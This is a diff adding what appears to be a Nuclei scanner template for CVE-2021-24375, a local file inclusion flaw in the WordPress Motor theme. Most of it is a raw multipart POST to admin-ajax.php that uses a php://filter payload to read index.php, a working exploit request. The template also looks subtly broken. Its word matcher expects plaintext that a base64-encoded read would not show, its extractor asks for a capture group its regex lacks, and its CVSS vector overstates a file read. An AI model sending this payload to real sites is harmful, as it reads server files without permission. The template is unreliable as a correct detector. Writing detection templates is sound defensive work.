@@ -1,0 +1,46 @@
+id: cve-2021-24375
+info:
+  name: WordPress Theme Motor File Inclusion Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Motor is a professional WordPress WooCommerce Theme for dealers, retailers, shops and mechanics. WordPress Motor Theme < 3.1.0 is vulnerable to Local File Inclusion, allowing attackers to read sensitive files.
+  reference:
+    - https://wpscan.com/vulnerability/d9518429-79d3-4b13-88ff-3722d05efa9f
+    - https://themeforest.net/item/motor-vehicles-parts-equipments-accessories-wordpress-woocommerce-theme/16829946
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+    cve-id: CVE-2021-24375
+  tags: file-inclusion,file-read
+
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------1699260943
+
+        ----------1699260943
+        Content-Disposition: form-data; name="action"
+        
+        motor_load_more
+        ----------1699260943
+        Content-Disposition: form-data; name="file"
+        
+        php://filter/convert.base64-encode/resource=index.php
+        ----------1699260943--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "admin_email_remind_later"
+        part: body
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - "(?i)admin_email_remind_later"
